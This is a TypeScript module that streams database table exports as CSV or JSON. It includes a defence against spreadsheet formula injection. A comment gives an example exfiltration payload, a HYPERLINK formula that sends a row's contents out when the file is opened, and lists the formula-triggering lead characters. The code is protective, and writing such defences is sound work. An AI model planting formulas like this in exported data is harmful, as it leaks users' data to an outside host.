// An export table encoded as CSV or JSON, streamed a page at a time.

import { type SQL } from 'drizzle-orm'
import type { PipelineDb } from '../pipeline/store'
import { EXPORT_PAGE_SIZE, type ExportTable, type Row } from './terminal-export-views'

export type ExportFormat = 'csv' | 'json'

/**
 * `<table>.<format>` off a request path. A router param cannot own half a
 * segment, so the route is one `[file].get.ts` (and one under sample/) and
 * both the table and the format are read here.
 */
export function parseExportPath(path: string): { name: string; format: ExportFormat } | null {
  const file = path.split('?')[0]!.split('/').pop() ?? ''
  const match = file.match(/^([a-z_]+)\.(csv|json)$/)
  return match ? { name: match[1]!, format: match[2] as ExportFormat } : null
}

// ---- CSV -------------------------------------------------------------------

/**
 * Characters a spreadsheet reads as "this cell is a formula" when they lead.
 * Tab and carriage return are here because Excel skips leading whitespace
 * before deciding, so `\t=cmd` is a formula too.
 */
const FORMULA_LEAD = /^[=+@\t\r]/

/** A cell that is just a number. `-3.5e4` leads with `-` and is not a formula. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/

/**
 * Defuse a cell a spreadsheet would execute.
 *
 * These exports are meant to be opened in Excel or Sheets — that is what
 * `Content-Disposition: attachment` is for — and the strings in them are not
 * ours: job titles, incident titles, vendor price notes and judge-written
 * headlines all originate outside this Worker. A cell beginning `=`, `+`, `@`
 * or `-` is a formula there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates
 * the row on open, with no macro prompt and no warning.
 *
 * A leading apostrophe is the standard defusal: the spreadsheet treats the
 * rest as literal text. It is visible in the cell, which is a real cost for a
 * project that exports verbatim source data — so it is spent only where a
 * value would otherwise be executed, and never on a plain number, which is
 * the one case where a leading `-` is data rather than a fuse.
 */
export function defuseFormula(text: string): string {
  if (FORMULA_LEAD.test(text)) return `'${text}`
  if (text.startsWith('-') && !PLAIN_NUMBER.test(text)) return `'${text}`
  return text
}

/** RFC 4180: quote when the value carries a comma, a quote, or a line break.
 * A list (an incident's components) is one JSON cell, not a comma-joined string
 * that a spreadsheet would split. Formula leads are defused first — see
 * defuseFormula — so quoting never wraps a cell the reader would execute. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return ''
  const text = defuseFormula(
    typeof value === 'string'
      ? value
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value),
  )
  return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}

export function csvLine(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(',')}\r\n`
}

// ---- streaming -------------------------------------------------------------

/** Every row of `table` in export order, a page at a time. */
export async function* exportPages(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
  pageSize: number = EXPORT_PAGE_SIZE,
): AsyncGenerator<Row[]> {
  let after: Row | null = null
  for (;;) {
    const rows = await table.page(db, after, pageSize, where)
    if (rows.length === 0) return
    yield rows
    if (rows.length < pageSize) return
    after = rows.at(-1)!
  }
}

export async function* csvChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield csvLine(table.columns)
  for await (const rows of exportPages(db, table, where)) {
    yield rows.map((row) => csvLine(table.columns.map((c) => row[c]))).join('')
  }
}

export async function* jsonChunks(
  db: PipelineDb,
  table: ExportTable,
  where?: SQL,
): AsyncGenerator<string> {
  yield '[\n'
  let first = true
  for await (const rows of exportPages(db, table, where)) {
    const body = rows.map((row) => JSON.stringify(row)).join(',\n')
    yield `${first ? '' : ',\n'}${body}`
    first = false
  }
  yield '\n]\n'
}

/**
 * jsonChunks inside an object: `head`'s fields, then the rows under `rows`.
 * A full-history export is served this way so its license travels in the file.
 */
export async function* jsonEnvelopeChunks(
  db: PipelineDb,
  table: ExportTable,
  where: SQL | undefined,
  head: Record<string, unknown>,
): AsyncGenerator<string> {
  yield `${JSON.stringify(head).slice(0, -1)},"rows":`
  yield* jsonChunks(db, table, where)
  yield '}\n'
}

/** A byte stream over text chunks; the generator is closed if the reader goes away. */
export function streamOf(chunks: AsyncGenerator<string>): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder()
  return new ReadableStream<Uint8Array>({
    async pull(controller) {
      const { value, done } = await chunks.next()
      if (done) controller.close()
      else controller.enqueue(encoder.encode(value))
    },
    async cancel() {
      await chunks.return(undefined)
    },
  })
}

/** Everything the stream yielded, joined — for tests and small exports. */
export async function collect(chunks: AsyncGenerator<string>): Promise<string> {
  let out = ''
  for await (const chunk of chunks) out += chunk
  return out
}
